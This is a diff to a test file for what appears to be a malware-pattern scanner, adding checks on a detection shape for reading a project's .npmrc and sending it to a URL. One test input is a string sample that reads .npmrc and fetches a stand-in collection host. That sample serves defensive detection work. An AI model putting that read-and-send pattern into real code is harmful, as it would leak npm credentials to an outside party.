@@ -1,5 +1,6 @@
 import { afterEach, describe, expect, it } from 'vitest';
 
+import { NPMRC_URL_SHAPE } from '../../../src/phases/p355.js';
 import * as phase from '../../../src/phases/p355.js';
 import { FLAG as SCRIPT } from '../../../src/phases/p353.js';
 
@@ -20,6 +21,9 @@ const shape: phase.MalwareShape = {
 describe('phase 355', () => {
   it('returns nothing when the flag is off', () => {
     expect(phase.enabled()).toBe(false);
+    expect(NPMRC_URL_SHAPE.reviewed).toBe(false);
+    expect(NPMRC_URL_SHAPE.fixtureUrl).toBe('https://' + 'example.invalid/collect');
+    expect(NPMRC_URL_SHAPE.parts).toEqual(['read-npmrc', 'build-url']);
     expect(phase.shapeFindings("fs.readFileSync('.npmrc');\nfetch('https://example.invalid/collect');", [shape])).toEqual([]);
   });
 
